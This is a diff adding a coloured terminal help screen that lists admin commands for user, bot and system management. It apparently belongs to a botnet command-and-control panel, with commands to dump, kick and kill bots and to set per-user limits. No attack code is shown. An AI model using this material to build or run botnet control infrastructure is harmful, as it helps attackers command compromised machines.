@@ -1,0 +1,29 @@
+\033[8;27;80t\033[2J\033[H\033[38;5;231m\r
+
+ Admin Commands\x1b[38;5;160m:\r\r
+\033[38;5;231m  User Management\x1b[38;5;160m:\r\r
+\033[38;5;231m  !adduser    \x1b[38;5;160m:\033[38;5;231m add new user\033[38;5;231m.\r\r
+\033[38;5;231m  !removeuser \x1b[38;5;160m:\033[38;5;231m remove user (alias: !deluser)\033[38;5;231m.\r\r
+\033[38;5;231m  !edituser   \x1b[38;5;160m:\033[38;5;231m edit user permissions and limits\033[38;5;231m.\r\r
+\033[38;5;231m  !userinfo   \x1b[38;5;160m:\033[38;5;231m show detailed user info\033[38;5;231m.\r\r
+\033[38;5;231m  !resetpass  \x1b[38;5;160m:\033[38;5;231m reset user password\033[38;5;231m.\r\r
+\033[38;5;231m  !users      \x1b[38;5;160m:\033[38;5;231m list all users\033[38;5;231m.\r\r
+\033[38;5;231m  !kickuser   \x1b[38;5;160m:\033[38;5;231m kick user from server\033[38;5;231m.\r\r
+\033[38;5;231m  !ban        \x1b[38;5;160m:\033[38;5;231m ban a user\033[38;5;231m.\r\r
+\033[38;5;231m  !unban      \x1b[38;5;160m:\033[38;5;231m unban a user\033[38;5;231m.\r\r
+\033[38;5;231m  !sessions   \x1b[38;5;160m:\033[38;5;231m view active sessions\033[38;5;231m.\r\r
+\r\r
+\033[38;5;231m  Bot Management\x1b[38;5;160m:\r\r
+\033[38;5;231m  !dumpbots   \x1b[38;5;160m:\033[38;5;231m dump bot list\033[38;5;231m.\r\r
+\033[38;5;231m  !kickbot    \x1b[38;5;160m:\033[38;5;231m kick specific bot\033[38;5;231m.\r\r
+\033[38;5;231m  !killbot    \x1b[38;5;160m:\033[38;5;231m kill specific bot (CMD_KILL)\033[38;5;231m.\r\r
+\033[38;5;231m  !kickbots   \x1b[38;5;160m:\033[38;5;231m kick all bots\033[38;5;231m.\r\r
+\033[38;5;231m  !botstats   \x1b[38;5;160m:\033[38;5;231m show bot statistics\033[38;5;231m.\r\r
+\033[38;5;231m  !botinfo    \x1b[38;5;160m:\033[38;5;231m show detailed bot info\033[38;5;231m.\r\r
+\r\r
+\033[38;5;231m  System Management\x1b[38;5;160m:\r\r
+\033[38;5;231m  !sysinfo    \x1b[38;5;160m:\033[38;5;231m show system info\033[38;5;231m.\r\r
+\033[38;5;231m  !logs       \x1b[38;5;160m:\033[38;5;231m view system logs\033[38;5;231m.\r\r
+\033[38;5;231m  !blacklist  \x1b[38;5;160m:\033[38;5;231m manage IP blacklist\033[38;5;231m.\r\r
+\033[38;5;231m  !sshkey     \x1b[38;5;160m:\033[38;5;231m show | set <key> | remove (SSH pubkey for your account)\033[38;5;231m.\r\r
+\033[0m\r
